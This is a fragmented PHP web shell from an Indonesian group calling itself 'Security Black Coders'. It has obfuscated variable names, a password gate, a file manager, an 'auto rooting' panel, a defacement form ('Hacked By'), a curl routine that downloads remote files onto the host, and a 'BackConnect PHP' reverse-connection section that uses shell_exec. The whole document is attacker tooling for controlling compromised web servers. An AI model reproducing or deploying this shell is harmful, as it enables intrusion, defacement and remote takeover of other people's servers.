...
if($_POST['password'] == $pass) {
  ...
  echo "<script>window.location='?SBS'</script>";
}
if($_GET['page'] == "blank") {
  echo "<a href='?'>Back</a>";
  exit();
...
?>
<title>Security Black Coders [~]Shell</title>
...
<html>
<head>
	<title>Security Black Coders</title>
</head>
<style>
	input { margin:0;background-color:#fff;border:1px solid #fff; }
</style>
<body bgcolor="black">
	<center><img src="https://j.top4top.io/p_238291t9z1.jpg" style="opacity:0.5; width:500px; height:500px";></center>
	<center><h1><center><font color="red" face="Patrick Hand">-=[ Welcome To</font><font color="white" face="Patrick Hand"> Security Black Coders ]=-</font><br>
</center>
...
$IIIIIIII1l1I = "<img src='https://icons.iconarchive.com/icons/mcdo-design/cats-2/128/Blue-Coffee-2-icon.png' class='ico'></img>";
$IIIIIIII1l1l = "<img src='https://icons.iconarchive.com/icons/dario-arnaez/genesis-3G/256/User-Files-icon.png' class='ico2'></img>";
...
echo '<div class="card text-center bg-light about">
		<h4 class="card-header">{ Security Black Coders }</h4>
		<div class="card-body">
		<center><div class="img"></div></center>
		<p class="card-text">{ Security Black Coders } Adalah Sebuah Komunitas Yang Berfokus Kepada Teknologi Di Indonesia, Dari Membuat Mengamankan Dan Mengexploitasi Sebuah Sistem.</p>
		</div>
		<div class="card-footer">
		<small class="card-text text-muted">Copyright 2019 { Security Black Coders }</small>
		</div>
		</div><br/>';
exit;
}
...
echo '<div class="card">
		<div class="card-body form-group">
		<p class="text-muted">Auto Rooting Server By DigitalCorporation Project</p>';
...
echo "<form method='post'>
			...
			<textarea name='script' class='form-control' rows='13' placeholder='[Ex] Hacked By { Security Black Coders }'></textarea><br/>
...
$IIIIIII1Il1l = fopen($isi,'w');
$IIIIIIllIIII = curl_init();
curl_setopt($IIIIIIllIIII,CURLOPT_URL,$url);
curl_setopt($IIIIIIllIIII,CURLOPT_BINARYTRANSFER,true);
curl_setopt($IIIIIIllIIII,CURLOPT_RETURNTRANSFER,true);
curl_setopt($IIIIIIllIIII,CURLOPT_SSL_VERIFYPEER,false);
curl_setopt($IIIIIIllIIII,CURLOPT_FILE,$IIIIIII1Il1l);
return curl_exec($IIIIIIllIIII);
curl_close($IIIIIIllIIII);
fclose($IIIIIII1Il1l);
ob_flush();
flush();
}
if(file_exists('adminer.php')){
echo "<a href='$IIIIIII1l1ll/adminer.php' target='_blank' class='text-center btn btn-success btn-block mb-3'>Login Adminer</a>";
}else{
...
$IIIIIIlIIllI = base64_decode('');
...
$IIIIIIlIIl1I = base64_decode('');
...
fputs ($IIIIIIlII1Il ,"
				\n{#######################################}
				\n..:: BackConnect PHP By Ndr4_Xc0d3r5 ::..
				\n{#######################################}\n");
$dir = @shell_exec('pwd');
...
<head>
	...
	<meta name="copyright" content="{ Security Black Coders }"/>
	<link rel="icon" type="image/png" href="https://j.top4top.io/p_238291t9z1.jpg"/>
	<title>{ Security Black Coders sHell }</title>
...
<body class="bg-dark text-light">
	...
	<style>
		...
		.about .card-body .img{
			position: relative;
			background: url(https://j.top4top.io/p_238291t9z1.jpg);
	...
	<nav class="navbar static-top navbar-dark">
		...
		<div class="collapse navbar-collapse" id="info">
			<ul>
				<a href="https://www.facebook.com/groups/1500068917077996/" class="lain"><i class="fa fa-facebook tambah"></i></a>
				<a href="https://www.instagram.com/securityblackcoders/" class="lain"><i class="fa fa-instagram tambah"></i></a>
				<a href="https://github.com/SecurityBlackCoders/" class="lain"><i class="fa fa-github tambah"></i></a>
				<a href="https://securityblackcoders.tech/" class="lain"><i class="fa fa-globe tambah"></i></a>
			</ul>
		</div>
	</nav>
	';
echo '<div class="container">
	<h1 class="text-center"><a href="https://www.instagram.com/securityblackcoders/" style="color:#ffffff;">{ Security Black Coders }</h1>
...
if($IIIIIIlll1Il == 'php'){
echo 'https://icons.iconarchive.com/icons/arrioch/senary/256/Internet-php-icon.png"';
}elseif ($IIIIIIlll1Il == 'html'){
echo 'https://icons.iconarchive.com/icons/arrioch/senary/256/Internet-html-icon.png"';
}elseif ($IIIIIIlll1Il == 'css'){
echo 'https://icons.iconarchive.com/icons/graphics-vibe/developer/256/css-3-icon.png"';
}elseif ($IIIIIIlll1Il == 'png'){
echo 'https://icons.iconarchive.com/icons/arrioch/senary/256/Picture-png-icon.png"';
}elseif ($IIIIIIlll1Il == 'jpg'){
echo 'https://icons.iconarchive.com/icons/arrioch/senary/256/Picture-png-icon.png"';
}elseif ($IIIIIIlll1Il == 'jpeg'){
echo 'https://icons.iconarchive.com/icons/arrioch/senary/256/Picture-png-icon.png"';
}elseif($IIIIIIlll1Il == 'zip'){
echo 'https://icons.iconarchive.com/icons/dario-arnaez/genesis-3G/256/User-Files-icon.png"';
}elseif ($IIIIIIlll1Il == 'js'){
echo 'https://icons.iconarchive.com/icons/ahmadhania/spherical/128/file-JavaScript-icon.png';
}elseif ($IIIIIIlll1Il == 'ttf'){
echo 'https://icons.iconarchive.com/icons/dario-arnaez/genesis-3G/256/User-Files-icon.png';
}elseif ($IIIIIIlll1Il == 'otf'){
echo 'https://icons.iconarchive.com/icons/dario-arnaez/genesis-3G/256/User-Files-icon.png';
}elseif ($IIIIIIlll1Il == 'txt'){
echo 'https://icons.iconarchive.com/icons/guillendesign/variations-2/256/Text-icon.png';
...
echo 'https://icons.iconarchive.com/icons/untergunter/leaf-mimes/256/text-x-python-icon.png';
...
echo '</table></div><hr/>
					<center><a class="text-muted" href="https://www.instagram.com/securityblackcoders/">Copyright 2019 { Security Black Coders }</a></center><br/>';
